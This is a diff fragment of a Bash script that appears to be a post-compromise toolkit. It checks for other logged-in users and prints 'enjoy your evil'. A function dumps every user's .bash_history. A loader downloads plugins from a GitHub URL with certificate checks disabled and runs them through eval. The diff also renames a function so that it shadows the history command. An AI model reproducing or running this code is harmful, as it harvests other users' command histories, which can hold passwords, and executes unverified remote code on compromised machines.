@@ -86,7 +86,7 @@ if [ $(( $(w|grep pts | wc -l ) )) -gt 0 ];then #_fdsagadsfasdgadsgsss
 else #_fdsagadsfasdgadsgsss
     gglog ${UNDERLINE}" safe ! -- enjoy your evil " #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
-hist() { #_fdsagadsfasdgadsgsss
+history() { #_fdsagadsfasdgadsgsss
   cat $HOME/.bash_history; #_fdsagadsfasdgadsgsss
   if [ $(( $(ls /home | wc -l) )) -gt 0 ];then #_fdsagadsfasdgadsgsss
     cat /home/*/.bash_history; #_fdsagadsfasdgadsgsss
@@ -108,5 +108,5 @@ plist() { #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
 load() { #_fdsagadsfasdgadsgsss
   gglog 'load' $1; #_fdsagadsfasdgadsgsss
-  wget --no-check-certificate -q 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/plugins/$1' -O-  | source #_fdsagadsfasdgadsgsss
+  eval "$(wget --no-check-certificate -q 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/plugins/$1' -O-  )" #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
